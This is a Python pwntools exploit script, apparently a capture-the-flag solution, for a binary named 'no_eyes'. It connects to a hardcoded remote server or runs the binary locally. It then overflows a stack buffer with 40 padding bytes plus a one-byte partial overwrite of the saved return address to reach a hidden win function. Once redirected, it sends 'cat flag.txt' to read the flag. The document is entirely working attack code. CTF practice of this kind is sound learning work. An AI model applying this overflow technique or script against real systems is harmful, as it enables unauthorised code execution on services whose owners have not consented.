#!/usr/bin/env python3
from pwn import *


HOST = "34.62.69.250"
PORT = 41051

context.binary = ELF("./no_eyes", checksec=False)
context.terminal = ["bash", "-lc"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.LOCAL:
        return process(["./run.sh"])
    return process([context.binary.path])


def main():
    io = start()

    io.recvuntil(b"Input: ")

    # The saved return address ends in 0xe9 and the hidden win path is 0x122a.
    # A one-byte partial overwrite is enough to redirect execution there.
    payload = b"A" * 40 + b"\x2a"
    io.send(payload)

    if args.REMOTE or args.LOCAL:
        io.recvuntil(b"You found it!\n", timeout=1)
        io.sendline(b"cat flag.txt")

    io.interactive()


if __name__ == "__main__":
    main()
